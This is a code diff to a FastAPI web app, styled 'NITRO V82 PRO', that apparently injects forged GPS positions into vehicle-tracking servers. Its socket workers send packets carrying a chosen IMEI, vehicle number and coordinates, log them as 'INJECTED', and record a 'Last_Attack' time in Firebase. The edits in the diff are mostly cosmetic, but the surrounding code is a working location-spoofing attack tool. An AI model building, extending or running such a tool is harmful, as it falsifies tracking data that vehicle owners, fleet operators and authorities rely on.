@@ -9,14 +9,12 @@ from firebase_admin import credentials, db
 
 app = FastAPI()
 
-# --- 1. FIREBASE HANDSHAKE (FIXED PATH) ---
+# --- 1. FIREBASE HANDSHAKE (FIXED URL) ---
 try:
     cred = credentials.Certificate("serviceAccountKey.json")
     firebase_admin.initialize_app(cred, {
-        'databaseURL': 'https://ghop-ghop-gps-injection-default-rtdb.firebaseio.com'
+        'databaseURL': 'https://ghop-ghop-gps-injection-default-rtdb.firebaseio.com/'
     })
-    # Connection Check
-    test_ref = db.reference('Data_Records')
     print("✓ FIREBASE_CONNECTED: SUCCESS")
 except Exception as e:
     print(f"✗ FIREBASE_ERROR: {e}")
@@ -50,16 +48,17 @@ def handshake_worker(tag_list, imei, vno, lat, lon):
                 s.sendall(bytes(pkt, 'ascii'))
                 total_sent += 1
                 s.close()
-                logs.append(f"<span style='color:#0f0'>[{tm}] {tag} -> INJECTED_SUCCESS</span>")
+                logs.append(f"<span style='color:#0f0'>[{tm}] {tag} -> INJECTED</span>")
                 if len(logs) > 10: logs.pop(0)
                 time.sleep(0.1)
             except: time.sleep(1)
 
-# --- API ENDPOINTS (DATA SYNC) ---
+# --- API ENDPOINTS (FIXED FETCH) ---
 @app.get("/fetch_data")
 def fetch_data(vno: str):
     vno_clean = vno.upper().strip()
     try:
+        # DB Path matching your Data_Records structure
         ref = db.reference('Data_Records').child(vno_clean)
         res = ref.get()
         if res:
@@ -74,16 +73,13 @@ def init(v:str, i:str, lt:str, ln:str):
         v_up = v.upper().strip()
         firing, total_sent = True, 0
         logs = ["<span style='color:#fff'>[SYS] LOGGING TO DATABASE...</span>"]
-        
-        # Point: Database Save
         try:
             db.reference('Data_Records').child(v_up).update({
                 'Vehicle_No': v_up, 'IMEI_No': i, 'Lat': lt, 'Lon': ln,
                 'Status': 'Active', 'Last_Attack': (datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)).strftime('%H:%M:%S')
             })
             logs.append("<span style='color:#deff9a'>[SYS] DB_SYNC: OK</span>")
-        except Exception as e:
-            logs.append(f"<span style='color:#f00'>[ERR] DB_FAIL: {str(e)[:20]}</span>")
+        except: logs.append("<span style='color:#f00'>[ERR] DB_SYNC: FAILED</span>")
 
         chunks = [TAGS[x:x+5] for x in range(0, len(TAGS), 5)]
         for c in chunks: threading.Thread(target=handshake_worker, args=(c, i, v_up, lt, ln), daemon=True).start()
@@ -103,9 +99,9 @@ async def home():
     return """
     <html><head><title>NITRO V82 PRO | MASTER</title><style>
     body { background:#000; color:#0f0; font-family:monospace; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; }
-    .box { width:420px; border:1px solid #0f0; padding:25px; box-shadow:0 0 20px #0f0; background:rgba(0,10,0,0.95); border-radius:10px; }
+    .box { width:420px; border:2px solid #0f0; padding:25px; box-shadow:0 0 20px #0f0; background:rgba(0,10,0,0.95); border-radius:10px; }
     label { font-size:11px; display:block; margin-top:12px; color:#aaa; text-transform:uppercase; }
-    input { width:100%; background:#000; border:1px solid #0f0; color:#0f0; padding:12px; outline:none; text-transform:uppercase; }
+    input { width:100%; background:#000; border:1px solid #0f0; color:#0f0; padding:12px; outline:none; text-transform:uppercase; font-family:monospace; }
     .btn-row { display:flex; gap:10px; margin-top:20px; }
     button { flex:1; padding:15px; cursor:pointer; border:1px solid #0f0; background:transparent; color:#0f0; font-weight:bold; }
     button:hover { background:#0f0; color:#000; }
@@ -116,7 +112,7 @@ async def home():
         <label>> VEHICLE NUMBER</label>
         <input type="text" id="v" oninput="this.value=this.value.toUpperCase()" onblur="fetchData()" placeholder="BR01XXXXXX">
         <label>> IMEI NUMBER</label>
-        <input type="text" id="i">
+        <input type="text" id="i" placeholder="15 DIGITS">
         <div style="display:flex; gap:10px;">
             <div style="flex:1"><label>> LATITUDE</label><input type="text" id="lt"></div>
             <div style="flex:1"><label>> LONGITUDE</label><input type="text" id="ln"></div>
@@ -139,7 +135,7 @@ async def home():
                         document.getElementById('i').value = d.imei;
                         document.getElementById('lt').value = d.lat;
                         document.getElementById('ln').value = d.lon;
-                        document.getElementById('log').innerHTML = "[DB] DATA FETCHED SUCCESS";
+                        document.getElementById('log').innerHTML = "<span style='color:#fff'>[DB] DATA FETCHED SUCCESS</span>";
                     }
                 });
             }
